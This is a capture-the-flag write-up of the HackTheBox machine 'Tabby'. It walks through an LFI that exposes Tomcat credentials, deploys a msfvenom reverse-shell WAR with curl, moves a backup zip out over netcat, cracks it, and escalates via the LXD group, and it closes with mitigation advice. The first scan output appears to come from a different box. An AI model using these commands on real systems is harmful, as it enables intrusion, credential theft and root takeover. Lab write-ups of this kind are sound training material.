# Tabby

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage enumeration

__Exploitation__

- Local file inclusion

__Priv Esc__

- LXD group policy abuse

***

This is my write up for the HackTheBox Linux machine _Tabby_.

## User Flag

Let's enumerate some info about _Tabby_ with an `nmap` scan.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Fri Jun 26 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.21s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.26 - 2.6.35 (89%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (89%), Linux 3.16 - 4.6 (89%), Linux 2.6.32 - 3.13 (88%), Linux 3.3 (88%), Linux 2.6.23 - 2.6.38 (88%), Linux 2.6.31 - 2.6.32 (88%), Linux 2.6.32 (88%), Linux 2.6.32 - 2.6.39 (88%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 seconds
```

Our scan indicates that port 21 is visible, but closed. It also shows that port 80 is open, serving an HTTP webpage. The normal scan only checks the 1000 most popular ports, so let's also run a full port scan.

```
# Nmap 7.80 scan initiated Fri Jun 26 17:10:01 2020 as: nmap -O -sV -sC -p- -oN full194
[...]
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
[...]
```

Our full scan also reveals that port 8080 is open and an HTTP webpage running `Apache Tomcat` is available. Let's go ahead an enumerate the webpage on port 80 first.  

![](images/megahost.png)

The primary website looks like a frontend for a hosting service. A lot of information is available, especially about a recent data breach, but overall, the site doesn't have anything that may prove useful.

However, something stands out on the `news.php` page. There is a `file` parameter in the URL and the value `statement` is being passed to it, which we can assume is the file name that is loaded to the page. If the input for the variable is not properly sanitized, we may be able to perform a directory traversal attack due to a [local file inclusion (LFI) vulnerability](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/).

![](images/dt-attack.png)

Instead of guessing a file name and location we want to see, let's enumerate port 8080 and return to this later.

![](images/tomcat.png)

This looks like the default page for `Apache Tomcat`. Clicking the various links yields nothing useful, but the file paths throughout the page hint to the file system structure of the box. A quick search reveals that some `tomcat` credentials may be stored in the `tomcat-users.xml` file somewhere within the `Tomcat` directory.

We can also enumerate the version of `Tomcat` based on this page: version 9. The credentials for this version should be located at the file path `/usr/share/tomcat9/etc/tomcat-users.xml`. This would be a great opportunity to go back to our potential LFI vulnerability at the `10.10.10.194/news.php?file=statement` page and see if we can retrieve this file.

We'll capture the request to this page with Burp Suite so we can easily manipulate the `file` parameter. To traverse to a specific file, we'll have to go back multiple directories with `../../` to get the root directory, then we can specify our full target file path. We have to do it quite a bit since we're not sure where our current directory is. To avoid any misinterpretations with the slashes, we need to URL encode them. Let's replace the `statement` variable with our encoded traversal and the full file path to the file we're trying to retrieve.

Let's send our request.

![](images/burp-dt.png)

Success, we receive the file in our response.

Additionally, we also see the roles that the `tomcat` user has. The `manager-script` role allows us to remotely deploy web archive (WAR) files to the webserver, with our new found credentials.

First, we need to create a malicious WAR file. To do this, we'll use `msfvenom`.

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.121 LPORT=4444 -f war > evil.war
```

Next, we'll use curl to upload our file, utilizing the credentials we found.

```
$ curl  --upload-file evil.war http://tomcat:\$3cureP4s5w0rd123\!@10.10.10.194:8080/manager/text/deploy?path=/evil
```

Let's start our listener in preparation for a reverse shell.

```
$ nc -lvnp 4444
```

Finally, navigating to `http://10.10.10.194:8080/evil/` triggers our payload, and we receive a reverse shell. We'll also make our shell a little more interactive.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
```

Let's look around where we landed. Enumerating a bit leads us to the `/var/www/html/files` directory. Here, we find a zipped backup named `16162020_backup.zip`. Let's use `netcat` to download this to our machine and give it a look.

On our machine, we'll listen for a callback with the file.

```
$ nc -lp 5555 > backup.zip
```

On the _Tabby_ box let's run the following command to send it.

```
$ nc -w 3 10.10.14.121 5555 < 16162020_backup.zip
```

Attempting to open the zip prompts for a password. We can extract password hashes with `zip2john` or one of the various online extractors. I had problmes with `zip2john`, so I went with an [online tool](https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php).

![](images/zip-hash.png)

We'll save the output into a file named `zip.hash` and use john to crack it.

![](images/john.png)

The hash cracks and we receive a password: `admin@it`. In the `/etc/passwd` file, we find the user `ash` is present on the box. Let's see if we can change users with our new password.

```
$ su ash
```

It works! We've successfully moved to `ash`. Let's grab the first flag.

![](images/user-flag.png)

## Root Flag

On to root. First thing, let's do a bit of enumeration with the user `ash`. Just to check out own privileges, we'll run the `id` and `sudo -l` commands. `sudo -l` is of little use, but `id` reveals the groups that `ash` is apart of, the most interesting being `lxd`.

```
$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

A little research reveals that LXD, a container technology, can be used to [perform privilege escalation](https://www.hackingarticles.in/lxd-privilege-escalation/).

Essentially, we're going to build a Linux Container with `ash`, duplicating the host file system, then we can open a shell as root within our container, allowing us to enumerate the file system of the host machine in a privileged context.

First, let's grab the LXD image that we'll use for the privilege escalation. We'll also run the `build-alpine` script to create the image.

```
$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
$ sudo bash build-alpine
```

On the target machine, we'll start a `netcat` listener in preparation to download the image.

```
$ nc -lp 5555 > alpine-v3.12-x86_64-20200701_1818.tar.gz
```

Next, we'll execute the following command on our box to start the transfer.

```
$ nc -w 3 10.10.10.194 5555 < alpine-v3.12-x86_64-20200701_1818.tar.gz
```

Now, we'll switch back to the machine and add the image to LXD with the following command. We'll also list the images to make sure it worked.

```
$ lxc image import alpine-v3.12-x86_64-20200701_1818.tar.gz --alias pe4me
$ lxc image list
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| pe4me | e75871098130 | no     | alpine v3.12 (20200701_18:18) | x86_64       | CONTAINER | 3.05MB | Jul 2, 2020 at 12:05am (UTC) |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

Looks to be there. Finally let's run this series of commands that will prepare the container.

```
$ lxd init --auto
$ lxc init pe4me ignite -c security.privileged=true
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
```

With everything prepared, we'll execute this final command to open a shell as root.

![](images/pe-root.png)

Success! Let's navigate to where the image is mounted and grab our final flag!

![](images/root-flag.png)

***

### Mitigation

- It's important to be aware of what a Local File Inclusion vulnerability looks like and the impact of one existing on a webpage. The best practice is to create a whitelist for filenames to prevent displaying sensitive files. Additionally, identifiers should be used in place of the actual filename and should call the file themselves. [This article](https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/) from PivotPoint Security provides some great details.

- Avoid leaving the default page or pages for a web server environment. This can provide an attacker with invaluable data about version, applications, etc.. Without the default `Apache Tomcat` page revealing the version and file location information, it would have been much more difficult to produce anything of substance with the LFI vulnerability.

- Due to the power of a user in the `lxd` group, they should be treated with as much caution and security as the root user. [According to Shenanigans Labs](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html): "The LXD team has updated their documentation to warn not to add users to the lxd group unless you trust them with root level access to your host."

### Final Thoughts

This was a fun box. I enjoyed that the path to root wasn't necessarily a string of severe vulnerabilities, but mostly misconfigurations that were abused because of the LFI. Without it, the other issues would not have been exasperated. Abusing the `lxd` group was also interesting to see and step through.
